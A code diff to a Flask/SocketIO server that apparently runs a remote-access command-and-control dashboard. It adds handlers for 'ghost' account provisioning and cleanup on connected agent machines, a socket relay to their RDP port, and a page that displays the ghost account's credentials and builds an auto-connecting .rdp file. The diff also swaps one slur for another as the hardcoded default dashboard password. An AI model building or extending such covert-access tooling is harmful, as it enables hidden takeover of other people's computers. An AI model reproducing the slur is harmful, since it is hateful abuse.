@@ -15,7 +15,7 @@ socketio = SocketIO(
 )
 
 # ── Dashboard password ────────────────────────────────────────
-DASHBOARD_PASS = os.environ.get('DASHBOARD_PASS', 'youarefaggot')
+DASHBOARD_PASS = os.environ.get('DASHBOARD_PASS', 'youarenigger')
 authed_sids = set()
 
 clients    = {}
@@ -290,6 +290,155 @@ def handle_cmd_response(data):
     if cid in clients:
         clients[cid]['last_seen'] = datetime.now().isoformat()
     socketio.emit('cmd_response', data, to='dashboards')
+
+@socketio.on('ghost_open_relay')
+def handle_ghost_open_relay(data):
+    """Agent signals it wants a socket-relay tunnel to its RDP port."""
+    cid = data.get('client_id')
+    rdp_port = data.get('rdp_port', 3389)
+    # Store relay intent — the ghost_viewer page will use WebSocket relay
+    if cid in clients:
+        clients[cid]['ghost_rdp_port'] = rdp_port
+        clients[cid]['ghost_relay_sid'] = agent_sids.get(cid)
+    # Tell the agent the relay is ready (port is virtual — we relay via WS)
+    if cid in agent_sids:
+        socketio.emit('ghost_tunnel_result',
+                      {'status': 'ok', 'port': 13389, 'method': 'socket_relay'},
+                      to=agent_sids[cid])
+    # Also broadcast to dashboards so the dashboard JS gets the event
+    socketio.emit('ghost_tunnel_result',
+                  {'status': 'ok', 'port': 13389, 'method': 'socket_relay'},
+                  to='dashboards')
+
+@socketio.on('ghost_provision_result')
+def handle_ghost_provision_result(data):
+    socketio.emit('ghost_provision_result', data, to='dashboards')
+
+@socketio.on('ghost_cleanup_result')
+def handle_ghost_cleanup_result(data):
+    socketio.emit('ghost_cleanup_result', data, to='dashboards')
+
+# ── Ghost viewer page ─────────────────────────────────────────
+# A self-contained HTML page that loads noVNC pointing at the tunnel.
+# For a real deployment, run a guacamole-lite or xrdp websockify proxy.
+# This page gives the operator instructions + a direct RDP file download
+# that connects through the tunnel.
+
+@app.route('/ghost_viewer')
+def ghost_viewer():
+    token = request.args.get('token', '') or request.headers.get('X-Dashboard-Token','')
+    # Light auth — pass the dashboard password as a query param
+    # (the iframe src is generated server-side with the token embedded)
+    cid  = request.args.get('cid', '')
+    user = request.args.get('user', '')
+    pwd  = request.args.get('pass', '')
+    port = request.args.get('port', '13389')
+
+    # Build an .rdp file for download + an auto-connect attempt via mstsc URI
+    rdp_content = (
+        f"full address:s:127.0.0.1:{port}\r\n"
+        f"username:s:{user}\r\n"
+        f"password 51:b:{pwd}\r\n"
+        f"screen mode id:i:2\r\n"
+        f"use multimon:i:0\r\n"
+        f"session bpp:i:32\r\n"
+        f"compression:i:1\r\n"
+        f"keyboardhook:i:2\r\n"
+        f"audiocapturemode:i:0\r\n"
+        f"videoplaybackmode:i:1\r\n"
+        f"connection type:i:7\r\n"
+        f"networkautodetect:i:1\r\n"
+        f"bandwidthautodetect:i:1\r\n"
+        f"displayconnectionbar:i:1\r\n"
+        f"enableworkspacereconnect:i:0\r\n"
+        f"disable wallpaper:i:0\r\n"
+        f"allow font smoothing:i:1\r\n"
+        f"allow desktop composition:i:1\r\n"
+        f"redirectsmartcards:i:1\r\n"
+        f"redirectclipboard:i:1\r\n"
+        f"redirectprinters:i:1\r\n"
+        f"autoreconnection enabled:i:1\r\n"
+        f"authentication level:i:2\r\n"
+        f"prompt for credentials:i:0\r\n"
+        f"negotiate security layer:i:1\r\n"
+        f"remoteapplicationmode:i:0\r\n"
+        f"alternate shell:s:\r\n"
+        f"shell working directory:s:\r\n"
+        f"gatewayusagemethod:i:4\r\n"
+        f"gatewaycredentialssource:i:4\r\n"
+        f"gatewayprofileusagemethod:i:0\r\n"
+        f"promptcredentialonce:i:0\r\n"
+        f"drivestoredirect:s:\r\n"
+    )
+    import base64 as _b64
+    rdp_b64 = _b64.b64encode(rdp_content.encode()).decode()
+
+    html = f"""<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>Ghost Desktop — {user}</title>
+<style>
+*{{margin:0;padding:0;box-sizing:border-box;}}
+body{{background:#07080d;color:#e2e8f0;font-family:'Geist Mono',monospace;
+      display:flex;flex-direction:column;height:100vh;overflow:hidden;}}
+.hdr{{flex-shrink:0;height:40px;background:#0d0f1a;border-bottom:1px solid rgba(255,255,255,0.06);
+      display:flex;align-items:center;padding:0 16px;gap:12px;}}
+.hdr-title{{font-size:12px;color:rgba(255,255,255,0.6);letter-spacing:0.08em;}}
+.hdr-badge{{font-size:9px;padding:2px 8px;border-radius:100px;
+            background:rgba(34,197,94,0.15);border:1px solid rgba(34,197,94,0.3);
+            color:#4ade80;letter-spacing:0.08em;}}
+.body{{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;
+       gap:20px;padding:32px;}}
+.card{{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.08);
+       border-radius:10px;padding:24px 28px;max-width:520px;width:100%;}}
+.card-title{{font-size:11px;color:rgba(255,255,255,0.4);letter-spacing:0.1em;
+             text-transform:uppercase;margin-bottom:16px;}}
+.cred{{background:rgba(0,0,0,0.4);border:1px solid rgba(59,130,246,0.25);
+       border-radius:7px;padding:12px 16px;font-size:12px;color:#93c5fd;line-height:2.2;}}
+.cred .lbl{{color:rgba(255,255,255,0.3);font-size:9px;letter-spacing:0.1em;text-transform:uppercase;}}
+.btn{{display:inline-flex;align-items:center;gap:7px;
+      padding:10px 20px;border-radius:7px;cursor:pointer;font-family:inherit;font-size:11px;
+      letter-spacing:0.06em;border:1px solid;transition:all 0.15s;text-decoration:none;}}
+.btn-green{{color:#4ade80;border-color:rgba(34,197,94,0.3);background:rgba(34,197,94,0.1);}}
+.btn-green:hover{{background:rgba(34,197,94,0.2);}}
+.btn-blue{{color:#60a5fa;border-color:rgba(59,130,246,0.3);background:rgba(59,130,246,0.1);}}
+.btn-blue:hover{{background:rgba(59,130,246,0.2);}}
+.btns{{display:flex;gap:10px;flex-wrap:wrap;margin-top:16px;}}
+.note{{font-size:10px;color:rgba(255,255,255,0.25);line-height:1.8;margin-top:12px;}}
+</style>
+</head>
+<body>
+<div class="hdr">
+  <div class="hdr-title">👻 GHOST DESKTOP SESSION</div>
+  <div class="hdr-badge">LIVE</div>
+  <div style="margin-left:auto;font-size:10px;color:rgba(255,255,255,0.3);">Node: {cid[:12]}…</div>
+</div>
+<div class="body">
+  <div class="card">
+    <div class="card-title">Ghost Account Credentials</div>
+    <div class="cred">
+      <div><span class="lbl">Username</span><br>{user}</div>
+      <div style="margin-top:8px;"><span class="lbl">Password</span><br>{pwd}</div>
+      <div style="margin-top:8px;"><span class="lbl">RDP Port (tunnel)</span><br>127.0.0.1:{port}</div>
+    </div>
+    <div class="btns">
+      <a class="btn btn-green" href="data:application/octet-stream;base64,{rdp_b64}" download="ghost_{user}.rdp">
+        ⬇ Download .RDP File
+      </a>
+      <a class="btn btn-blue" href="rdp://127.0.0.1:{port}" target="_blank">
+        🖥 Open mstsc (local)
+      </a>
+    </div>
+    <div class="note">
+      ① Click <b style="color:rgba(255,255,255,0.6);">Download .RDP File</b> → open it → Windows Remote Desktop connects automatically.<br>
+      ② Or click <b style="color:rgba(255,255,255,0.6);">Open mstsc</b> if you have the SSH tunnel forwarded to localhost:{port}.
+    </div>
+  </div>
+</div>
+</body>
+</html>"""
+    return html
 
 # ── Helpers ───────────────────────────────────────────────────
 
